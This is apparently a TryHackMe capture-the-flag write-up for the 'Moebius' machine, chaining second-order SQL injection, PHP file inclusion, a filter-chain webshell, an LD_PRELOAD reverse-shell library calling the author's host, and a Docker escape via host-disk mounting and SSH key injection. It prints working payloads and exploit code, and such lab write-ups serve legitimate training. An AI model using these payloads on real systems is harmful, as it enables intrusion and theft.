---
title: "Moebius"
date: 07-21-2025
excerpt: TryHackMe Writeup
cover: ../uploads/cover_moebius.jpg
tags: Second Order SQLi, PHP Filter Chain, Docker Escape
---

# Moebius — TryHackMe Writeup

Hey everyone, welcome back to another writeup! In this post, I'll be walking you through a detailed, step-by-step breakdown of how I approached and successfully rooted the latest Boot2Root machine on TryHackMe. From initial enumeration to privilege escalation, I'll cover the full exploitation process, sharing the tools, techniques, and thought processes I used along the way. Whether you're a beginner looking to learn or a seasoned hacker seeking a second perspective, I hope this helps sharpen your skills. Let's dive in!

## Reconnaissance

Let's start to scan the open ports for potential entry points using **nmap.**

```shell
nmap -sV -sC 10.10.213.96
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F808NZgxat4mBv62R0WO8%252FScreenshot%2520%28970%29.png%3Falt%3Dmedia%26token%3D169e856f-6562-41ff-ba7b-862f20d2261b&width=768&dpr=3&quality=100&sign=756bbdd2&sv=2)

Port 22 (SSH) and Port 80 (HTTP) are open

Let's visit the webpage for more information.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FmsbrdPxmti7xVLvRJGzN%252FScreenshot%2520%28972%29.png%3Falt%3Dmedia%26token%3Dcdab1f53-903d-416b-bd3e-d457a960eda9&width=768&dpr=3&quality=100&sign=b8308b65&sv=2)

A site for cat pictures>\_<!!! Let's try one!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FcSYYch57eoDiVrVn4Aox%252FScreenshot%2520%28973%29.png%3Falt%3Dmedia%26token%3Ddb50825c-2552-4511-a558-3eaaa8d271a5&width=768&dpr=3&quality=100&sign=37452cff&sv=2)

How cute:<<

## Enumeration

### Spotting the Suspicious URL Parameter

Take a close look at the URL, something's familiar, right?

Now let's click one of the pics

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhBigxI49iRD08BmQ9KKX%252FScreenshot%2520%28974%29.png%3Falt%3Dmedia%26token%3De8c26574-6d83-4090-ba8a-40f2f9f63e21&width=768&dpr=3&quality=100&sign=998f86b0&sv=2)

Woahhhh, a full path?? Something's fishy here, let's dive a little more.

### Confirming SQL Injection in album.php

Earlier, I pointed out that there was something suspicious about the URL—and it turns out to be a case of SQL Injection. If we revisit `album.php` and append a single quote (`'`) to the parameter value, here's what happens

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXsbQjPEZl8jvyh4V4njU%252FScreenshot%2520%28975%29.png%3Falt%3Dmedia%26token%3D080582b9-a1fa-4ee6-bb83-861d2d74171e&width=768&dpr=3&quality=100&sign=5c28c5e2&sv=2)

And we're right, we trigger a syntax error! This is a strong hint that this is vulnerable to SQL Injection! The next thing I did is to add a classic SQLi payload `' OR 1=1;-- -` and this is the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FggU740K07NAAPiaoCm52%252FScreenshot%2520%28976%29.png%3Falt%3Dmedia%26token%3D56f19c6a-cd99-4095-bd6b-79fb4b51f77e&width=768&dpr=3&quality=100&sign=f0cac235&sv=2)

It appears that some filters have been implemented, preventing us from successfully executing our SQL injection payloads. At this point we can actually use **sqlmap** to scan the site further and to bypass this filter.

```shell
sqlmap -u 'http://10.10.213.96/album.php?short_tag=cute' --batch --dbs --level 3 --risk 4 --threads 5
```

Here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FccHY4FY1chF52Ebb887Y%252FScreenshot%2520%28977%29.png%3Falt%3Dmedia%26token%3D092e7f77-479c-480e-9150-efcfc199c496&width=768&dpr=3&quality=100&sign=5a28474d&sv=2)

As shown here, we're presented with two databases. The one that stands out is the `web` database, so let's proceed to dump its contents.

```shell
sqlmap -u 'http://10.10.213.96/album.php?short_tag=cute' --batch -D web --dump --level 3 --risk 4 --threads 5
```

### Dumping the web Database

There are two tables in this database

1. albums

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2jVaUN4Ay3D7aS0kjjDc%252FScreenshot%2520%28978%29.png%3Falt%3Dmedia%26token%3Dd0bf5952-a626-478f-91c1-246004e94eb4&width=768&dpr=3&quality=100&sign=852a20d8&sv=2)

1. images

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F7NqhbWOaqAHpHGyAXPAG%252FScreenshot%2520%28979%29.png%3Falt%3Dmedia%26token%3D284c28c4-06a6-49f6-a530-e410c561209f&width=768&dpr=3&quality=100&sign=aadd98f6&sv=2)

When a valid `short_tag` is supplied to `album.php`, the application doesn't just fetch the album ID from the `albums` table—it also retrieves and displays image paths. This suggests that behind the scenes, there's another query interacting with the `images` table to gather related content.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FnfdJXCezYBDvCIFXGRa3%252FScreenshot%2520%28980%29.png%3Falt%3Dmedia%26token%3D25c5bd4c-9317-4539-b205-65724422dcac&width=768&dpr=3&quality=100&sign=de572186&sv=2)

It's likely that once the application retrieves the album ID through the `SELECT id FROM albums WHERE short_tag = '<short_tag>'` query, it then runs another query such as `SELECT * FROM images WHERE album_id = <album_id>`, using the album ID from the previous query. The album ID in this second query might not be properly sanitized, similar to how the `short_tag` was handled, leaving it vulnerable to SQL injection.

### Chaining a Second-Order Injection to Control the Image Path

When examining the database, we notice that image hashes aren't stored. This suggests that after fetching the image paths, the application likely generates the hashes programmatically. If we can inject into the second query to manipulate the image path it returns, we could force the application to calculate the hash for a custom path and use it in `/image.php`, potentially allowing us to include arbitrary files.

While we can't be certain this is exactly how the application works, we can test our hypothesis. By injecting a payload like `kuroshiro' UNION SELECT 0-- -` into the `short_tag` parameter and sending the request `http://10.10.213.96/album.php?short_tag=kuroshiro' UNION SELECT 0-- -`, we observe that we're able to control the `album_id` returned by the query.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2USwyvFPR0VX9OoTL8X4%252FScreenshot%2520%28981%29.png%3Falt%3Dmedia%26token%3D963ad268-26c2-4e86-b5fc-ecd3119447a5&width=768&dpr=3&quality=100&sign=fe1421b1&sv=2)

Rather than just manipulating the album ID, we can inject a payload like `kuroshiro' UNION SELECT "0 OR 1=1-- -"` into the `short_tag` parameter. This would alter the first query to return `0 OR 1=1-- -` as the album ID. If our assumption holds true, the second query would likely look something like `SELECT * FROM images WHERE album_id=0 OR 1=1-- -`. This condition would evaluate as true for all records, causing the application to retrieve and display every image in the database, bypassing any intended restrictions. After testing this injection, we confirm that the approach works precisely as anticipated, revealing all image paths.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FafESGOVJtxcTGTYd0HAl%252FScreenshot%2520%28982%29.png%3Falt%3Dmedia%26token%3D25adebb2-5506-4463-8c1f-fe4bcf5412b2&width=768&dpr=3&quality=100&sign=c64fe498&sv=2)

The injection behaves just as we predicted. Moving forward, we attempt a UNION-based SQL injection to manipulate the data returned by the second query—specifically, to gain control over the file path value. By using a payload like `kuroshiro' UNION SELECT "0 UNION SELECT 1,2,3-- -"-- -`, we identify that the query accepts three columns, and the third one corresponds to the image path displayed on the page.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FzNMGy2GZmz8cHiaH5NOG%252FScreenshot%2520%28983%29.png%3Falt%3Dmedia%26token%3D409c3101-490b-448e-ba00-26aa46afeb9d&width=768&dpr=3&quality=100&sign=2f369eda&sv=2)

### Achieving Local File Inclusion via /etc/passwd

To take things a step further, we aim to trick `album.php` into treating a system file like `/etc/passwd` as an image path. This would cause the application to calculate a hash for that file and potentially allow us to retrieve its contents through `image.php`. Initially, we try the payload `kuroshiro' UNION SELECT "0 UNION SELECT 1,2,'/etc/passwd'-- -"-- -`, but due to input filtering, this direct approach doesn't work. To bypass the filter, we encode the path in hexadecimal, resulting in a working payload: 

```sql
kuroshiro' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764-- -"-- -
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F7rkvBctEjSwIXUt6Ab5y%252FScreenshot%2520%28986%29.png%3Falt%3Dmedia%26token%3Dbc798470-2cac-4d03-aab8-072f8b989c21&width=768&dpr=3&quality=100&sign=54859523&sv=2)

Now let's click the endpoint at the source and we should see the content of `/etc/passwd` .

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfoXMqOwL1z6taU84Id4r%252FScreenshot%2520%28987%29.png%3Falt%3Dmedia%26token%3D68479cd8-38e1-4984-81fd-3061a761dd9a&width=768&dpr=3&quality=100&sign=f1e2697e&sv=2)

### Reading Source Code with php://filter

Now that we've confirmed the ability to include arbitrary files, one possible path to Remote Code Execution (RCE) would be through log poisoning. Unfortunately, after exploring the environment, we couldn't locate any accessible or writable log files to exploit this technique.

As an alternative, we can leverage PHP stream wrappers—specifically, the `php://filter` wrapper—to read internal application files in a base64-encoded format. This method is especially useful for bypassing direct source code viewing restrictions.

To start, we target `album.php` and apply the `php://filter/convert.base64-encode/resource=` wrapper to it. We then encode the entire string into hexadecimal to evade input filters, resulting in:
`7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870`.
Using this hex-encoded string, we construct the payload as follows

```sql
kuroshiro' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870-- -"-- -
```

This is the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FU5WvaIf0ApPopxe0mGrf%252FScreenshot%2520%28989%29.png%3Falt%3Dmedia%26token%3Dbcd7b54c-b584-4c79-8c1a-a0f3bc36d715&width=768&dpr=3&quality=100&sign=a6aeed72&sv=2)

Let's view the endpoint

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fsc9oaktRtDMITda6sJhn%252FScreenshot%2520%28990%29.png%3Falt%3Dmedia%26token%3D8904a30f-a4fc-4395-b5c2-6103a32cf8e4&width=768&dpr=3&quality=100&sign=488e23ce&sv=2)

As you can see here, the content is Base64 encoded, this is the decoded result

```php
<?php

include('dbconfig.php');

try {
    // Create a new PDO instance
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    
    // Set PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    if (preg_match('/[\/;]/', $_GET['short_tag'])) {
        // If it does, terminate with an error message
        die("Hacking attempt");
    }

    $album_id = "SELECT id from albums where short_tag = '" . $_GET['short_tag'] . "'";
    $result_album = $conn->prepare($album_id);
    $result_album->execute();
     
    $r=$result_album->fetch();
    $id=$r['id'];
    
     
    // Fetch image IDs from the database
    $sql_ids = "SELECT * FROM images where album_id=" . $id;
    $stmt_path= $conn->prepare($sql_ids);
    $stmt_path->execute();
    
    // Display the album id
    echo "<!-- Short tag: " . $_GET['short_tag'] . " - Album ID: " . $id . "-->\n";
    // Display images in a grid
    echo '<div class="grid-container">' . "\n";
    foreach ($stmt_path as $row) {
        // Get the image ID
        $path = $row["path"];
        $hash = hash_hmac('sha256', $path, $SECRET_KEY);

        // Create link to image.php with image ID
        echo '<div class="image-container">' . "\n";
        echo '<a href="/image.php?hash='. $hash . '&path=' . $path . '">';
        echo '<img src="/image.php?hash='. $hash . '&path=' . $path . '" alt="Image path: ' . $path . '">';
        echo "</a>\n";
        echo "</div>\n";;
    }
    echo "</div>\n";
} catch(PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

// Close the connection
$conn = null;

?>
```

Here, it's evident that the hashes are being generated using the HMAC-SHA256 algorithm.

### Recovering the SECRET_KEY from dbconfig.php

Interestingly, `album.php` doesn't directly declare the `SECRET_KEY`. Instead, it pulls in configurations from `dbconfig.php`, which strongly suggests that the key is stored within that included file. To access the contents of `dbconfig.php`, we can simply reuse the same technique we applied earlier to extract `album.php` .

```sql
kuroshiro' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870-- -"-- -
```

Here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fd9kWn2uddRqAsZ1e32op%252FScreenshot%2520%28992%29.png%3Falt%3Dmedia%26token%3De715f16e-6c11-48d2-9287-59a8e05d0f1a&width=768&dpr=3&quality=100&sign=2eaa97dd&sv=2)

Clicking the link and we will see a Base64 encoded string again, decode and this is the result

```php
<?php
// Database connection settings
$servername = "db";
$username = "web";
$password = "TAJnF6YuIot83X3g";
$dbname = "web";


$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
?>                                                                                        
```

With the `SECRET_KEY` now in our hands, we're able to generate legitimate HMAC-SHA256 hashes for arbitrary file paths. To streamline the process, we can use a Python script like the one below.

```python
import hmac
import hashlib

# Secret key and path
secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
path = b"php://filter/convert.base64-encode/resource=image.php"

# Generate HMAC-SHA256 signature
h = hmac.new(secret_key, path, hashlib.sha256)
signature = h.hexdigest()

print(signature)
```

Output

```text
ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6
```

Click the endpoint again and we will a Base64 encoded string, decode it and here's the content of `image.php` .

```php
<?php

include('dbconfig.php');
    // Create a new PDO instance
    // Set PDO error mode to exception
    // Get the image ID from the query string
    // Fetch image path from the database based on the ID
    // Fetch image path
    $image_path = $_GET['path'];
    $hash= $_GET['hash'];
    $computed_hash=hash_hmac('sha256', $image_path, $SECRET_KEY);
    
    if ($image_path && $computed_hash === $hash) {
        // Get the MIME type of the image
        $image_info = @getimagesize($image_path);
        if ($image_info && isset($image_info['mime'])) {
            $mime_type = $image_info['mime'];
            // Set the appropriate content type header
            header("Content-type: $mime_type");
            
            // Output the image data
            include($image_path);
        } else {
            header("Content-type: application/octet-stream");
            include($image_path);
        }
    } else {
        echo "Image not found";
    }


?>
```

So, how do we escalate this Local File Inclusion (LFI) flaw into Remote Code Execution (RCE)? While log injection is a common approach, another powerful method is leveraging PHP filter chains. By stacking filters creatively, we can craft a stream that acts like a virtual file containing arbitrary content — including PHP code — which the application will then interpret and execute.

## Exploitation

### Building a PHP Filter Chain RCE Payload

To create a custom filter chain payload, we can use a tool I discovered on GitHub called [php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator), which helps automate the process of building complex filter-based streams.

```shell
python3 php_filter_chain_generator.py --chain '<?php @eval($_REQUEST["0"]); ?>'
```

Here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FwoJKZ0vb8gw6AlRmsbPz%252FScreenshot%2520%281028%29.png%3Falt%3Dmedia%26token%3D37a00658-e1af-4c4b-a1dc-e724896686ef&width=768&dpr=3&quality=100&sign=97ba1e3c&sv=2)

With the target path identified, I've developed this exploit to enable the execution of custom PHP code on the server.

```python
import hmac
import hashlib
import requests

# Constants
ENDPOINT = "http://10.10.213.96/image.php"  # Change IP accordingly
AUTH_KEY = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
PAYLOAD_PATH = b"<PATH>"

def generate_signature(key: bytes, message: bytes) -> str:
    print("[*] Generating HMAC-SHA256 signature...")
    mac = hmac.new(key, message, hashlib.sha256)
    sig = mac.hexdigest()
    print(f"[+] Signature generated: {sig}")
    return sig

def send_payload(sig: str, encoded_path: bytes):
    print("[*] Starting interactive command injection session...")
    print(f"[+] Target endpoint: {ENDPOINT}")
    print(f"[+] Using path: {encoded_path.decode(errors='ignore')}")
    print(f"[+] Using signature: {sig}")
    while True:
        user_code = input("shell/> ")
        try:
            response = requests.get(
                ENDPOINT,
                params={
                    "hash": sig,
                    "path": encoded_path,
                    "0": user_code
                },
                timeout=5
            )
            print(response.text)
        except requests.RequestException as err:
            print(f"[!] Request failed: {err}")

if __name__ == "__main__":
    token = generate_signature(AUTH_KEY, PAYLOAD_PATH)
    send_payload(token, PAYLOAD_PATH)
```

Run and we should get a shell.

### Bypassing Disabled Functions with LD_PRELOAD

When I typed `system("whoami");` , this is the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FANuag8HNzTVEhpasrVMI%252FScreenshot%2520%28996%29.png%3Falt%3Dmedia%26token%3D7a231eae-063e-4931-ad72-862e87291c48&width=768&dpr=3&quality=100&sign=83f321d6&sv=2)

A quick look at the list of disabled PHP functions reveals the reason — `system` and several other critical functions have been restricted.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FQ0E4BLaA4AEY5AuBd9Sw%252FScreenshot%2520%28997%29.png%3Falt%3Dmedia%26token%3D121a3511-84eb-4d89-8e77-c6b9e71e1374&width=768&dpr=3&quality=100&sign=359285df&sv=2)

It appears that most of the critical functions that could aid in command execution have been disabled. However, by exploring potential workarounds, we might uncover a clever technique involving the `putenv` and `mail` functions. This method works by using `putenv` to set the `LD_PRELOAD` environment variable, which forces the system to load a specified shared library whenever a program is executed. By then triggering the `mail` function, the `sendmail` program is called, causing the library specified in `LD_PRELOAD` to be loaded and executed. This could provide a way to bypass the disabled functions and gain control over the system.

The first thing that we need to do is to write a custom shared library designed to trigger a reverse shell upon execution

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void startup_hook() {
    if (unsetenv("LD_PRELOAD") != 0) {
        perror("unsetenv failed");
    }

    const char *cmd = "bash -c 'bash -i >& /dev/tcp/10.9.3.99/443 0>&1'";
    int ret = system(cmd);

    if (ret == -1) {
        perror("system call failed");
    }
}

void _init() {
    startup_hook();
}
```

And we will compile it like this

```shell
gcc -o shell.so shell.c -fPIC -shared -nostartfiles
```

Next thing that we will do is to setup an HTTP Server in order for us to transfer the binary to the target server.

```shell
python3 -m http.server 1234
```

Now let's go back to out **shell/>,** execute this PHP command to download the binary to the server.

```php
$ch = curl_init('http://10.9.3.99:1234/shell.so');curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);file_put_contents('/tmp/shell.so', curl_exec($ch)); curl_close($ch);
```

Next is we will setup a listener using **Ncat**

```shell
nc -lnvp 443
```

Now that our listener is ready, let's execute the binary in the server.

```php
putenv('LD_PRELOAD=/tmp/shell.so'); mail('a','a','a','a');
```

Execute and we should gain a shell!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FsBnuRh00uy2icxt8eiMU%252FScreenshot%2520%281000%29.png%3Falt%3Dmedia%26token%3Df1f6387b-bff9-4b64-abaa-1e2271d4468f&width=768&dpr=3&quality=100&sign=26a9d548&sv=2)

We will execute this command to have a stable shell.

```shell
script -q -c "$(echo /bin/bash)" /dev/null
```

and

```shell
export TERM=xterm
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FU7pjWoA4i7CgKF7dNBF0%252FScreenshot%2520%281001%29.png%3Falt%3Dmedia%26token%3Dc04fb551-feff-4c73-bb8f-cb9ddc2d40d9&width=768&dpr=3&quality=100&sign=b5679ebd&sv=2)

### Escalating to Root via sudo

While investigating the server, I couldn't find anything useful, not even the user flag. The next step I took was to inspect the permissions by running the `sudo -l` command.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F458NuEiTbzLc4lZDreem%252Flalala.png%3Falt%3Dmedia%26token%3Dfb520778-37bb-4a05-a424-6dc0a9e8d25e&width=768&dpr=3&quality=100&sign=cb1cc5d9&sv=2)

It's full access? All we need to here is to type `sudo su` in order for us to switch to root user.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F85eZAPtgshvHwuXHOdox%252FScreenshot%2520%281003%29.png%3Falt%3Dmedia%26token%3D0c1c7f1d-d199-4754-b4e1-43ca7edbd0bc&width=768&dpr=3&quality=100&sign=318ad5bf&sv=2)

It works!

### Escaping the Container by Mounting the Host Filesystem

After that, we take a closer look at the container's assigned capabilities to see what actions it's allowed to perform.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FlR5l0ONRdvaXNZ5kbevp%252FScreenshot%2520%281005%29.png%3Falt%3Dmedia%26token%3Da9c12b14-e8c5-4eef-9499-84dac6511e9b&width=768&dpr=3&quality=100&sign=7e655ee6&sv=2)

Translating this value reveals that the container is equipped with a wide range of elevated capabilities.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fl3xMLxZOFWh9byj407OJ%252FScreenshot%2520%281006%29.png%3Falt%3Dmedia%26token%3D069ad7b2-b909-4e56-8120-5c3240481e11&width=768&dpr=3&quality=100&sign=558e2c1a&sv=2)

Given the extensive privileges available, several container escape techniques are possible. One of the most straightforward approaches involves mounting the host's root filesystem, as we have unrestricted access to its block devices.

```shell
mount /dev/nvme0n1p1 /mnt
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUkCYTw9pJJRUWiy4c8rv%252FScreenshot%2520%281007%29.png%3Falt%3Dmedia%26token%3Dfc95e531-7bf5-4fca-b415-1c5a1de16200&width=768&dpr=3&quality=100&sign=a5ed4c3&sv=2)

To leverage access to the host's filesystem for gaining shell access, one effective method is to inject our SSH public key into `/root/.ssh/authorized_keys`. The first step is to generate a new SSH key pair

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FCcgM9NKkvJAu3Q2Ge0zt%252FScreenshot%2520%281008%29.png%3Falt%3Dmedia%26token%3D6fbe26a0-5f01-435b-aa95-7e93ff7a9896&width=768&dpr=3&quality=100&sign=ba062dcc&sv=2)

This is our public key

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8y4rr1zruYXpkfPJDJ6N%252FScreenshot%2520%281009%29.png%3Falt%3Dmedia%26token%3Dac06796d-15bd-4a92-a37f-f371bd7d8ac0&width=768&dpr=3&quality=100&sign=82624458&sv=2)

All we need to do is to write the public key to `/mnt/root/.ssh/authorized_keys` of the server.

```shell
echo 'public_key' >> /mnt/root/.ssh/authorized_keys
```

Once the key has been placed, we can authenticate as the root user on the host machine by connecting via SSH using the corresponding private key, granting us full shell access.

```shell
ssh -i kuro root@10.10.213.96
```

Here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FKHTvInZY2QojGIE6acqh%252FScreenshot%2520%281012%29.png%3Falt%3Dmedia%26token%3Dc88ad3e6-6c25-4d7c-82a4-4b303ddd0c6e&width=768&dpr=3&quality=100&sign=e1c87e1a&sv=2)

And surprisingly, the user flag is in the root user. Xd

